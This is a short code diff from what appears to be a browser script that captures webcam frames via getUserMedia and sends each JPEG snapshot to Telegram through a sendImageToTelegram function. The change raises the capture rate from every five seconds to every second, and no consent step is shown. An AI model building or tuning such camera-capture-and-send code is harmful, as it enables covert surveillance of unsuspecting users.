@@ -39,7 +39,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
             canvas.toBlob(function (blob) {
                 sendImageToTelegram(blob);
             }, 'image/jpeg');
-        }, 5000);
+        }, 1000);
     });
 
     // Start playing the video
